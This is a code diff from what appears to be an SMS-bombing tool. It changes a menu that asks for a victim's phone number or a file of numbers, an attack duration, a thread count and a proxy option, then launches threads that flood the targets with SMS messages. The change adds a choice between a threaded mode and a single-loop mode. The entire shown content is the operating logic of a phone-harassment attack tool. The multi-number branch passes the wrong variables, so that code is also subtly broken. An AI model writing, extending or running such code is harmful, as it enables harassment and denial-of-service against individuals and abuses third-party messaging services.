@@ -247,55 +247,74 @@ def main():
 ┃┗━┛┃┃┃┃┃┃┗━┛┃
 ┗━━━┻┛┗┛┗┻━━━┛
 			''')
-			ans = input(Fore.YELLOW + Style.BRIGHT + 'Attack one phone(1) or more(2)? 1/2:\033[36m ')
-			if ans == '1':
+			ans1 = input(Fore.YELLOW + Style.BRIGHT + 'Threading(1) or while(2)? 1/2:\033[36m ')
+			if ans1 == '1':
+				ans = input(Fore.YELLOW + Style.BRIGHT + 'Attack one phone(1) or more(2)? 1/2:\033[36m ')
+				if ans == '1':
+					prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
+					code = input(Fore.YELLOW + Style.BRIGHT + "Target country code: \033[36m+")
+					number = code + input(Fore.YELLOW + Style.BRIGHT + f"Target number: \033[36m{code}")
+					tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
+					thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
+					for i in range(thr):
+						th = Thread(target=sms, args=(prx, number, tm, code,))
+						th.start()
+						print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + " thread started")
+
+					print(Fore.GREEN + "\nAttacking...")
+					time.sleep(tm+10)
+
+					print(Fore.GREEN + '''
+===============================
+            SUCCESS
+===============================
+					''')
+
+				elif ans == '2':
+					numbers = []
+					with open("numbers.txt", "r", encoding="utf-8") as file:
+						for line in file:
+							numbers.append(line)
+					numbers = [line.rstrip() for line in numbers]
+					print(f'Found {len(numbers)} numbers')
+					prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
+					tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
+					thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
+					for y in range(len(numbers)):
+						for i in range(thr):
+							th = Thread(target=sms, args=(prx, number, tm, code,))
+							th.start()
+							print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + f" thread for the number {numbers[y]} is running")
+
+					print(Fore.GREEN + "\nAttacking...")
+					time.sleep(tm+10)
+
+					print(Fore.GREEN + '''
+===============================
+            SUCCESS
+===============================
+					''')
+
+				else:
+					print(Fore.RED + '\nERROR!')
+
+			elif ans1 == '2':
 				prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
 				code = input(Fore.YELLOW + Style.BRIGHT + "Target country code: \033[36m+")
 				number = code + input(Fore.YELLOW + Style.BRIGHT + f"Target number: \033[36m{code}")
 				tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
-				thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
-				for i in range(thr):
-					th = Thread(target=sms, args=(prx, number, tm, code,))
-					th.start()
-					print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + " thread started")
 
 				print(Fore.GREEN + "\nAttacking...")
-				time.sleep(tm+10)
+				sms(prx, number, tm, code)
 
 				print(Fore.GREEN + '''
 ===============================
-            SUCCESS
+          SUCCESS
 ===============================
 				''')
-
-			elif ans == '2':
-				numbers = []
-				with open("numbers.txt", "r", encoding="utf-8") as file:
-					for line in file:
-						numbers.append(line)
-				numbers = [line.rstrip() for line in numbers]
-				print(f'Found {len(numbers)} numbers')
-				prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
-				tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
-				thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
-				for y in range(len(numbers)):
-					for i in range(thr):
-						th = Thread(target=sms, args=(prx, number, tm, code,))
-						th.start()
-						print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + f" thread for the number {numbers[y]} is running")
-
-				print(Fore.GREEN + "\nAttacking...")
-				time.sleep(tm+10)
-
-				print(Fore.GREEN + '''
-===============================
-            SUCCESS
-===============================
-				''')
-
 			else:
 				print(Fore.RED + '\nERROR!')
-
+				
 			ex()
 
 		elif ans == '3':
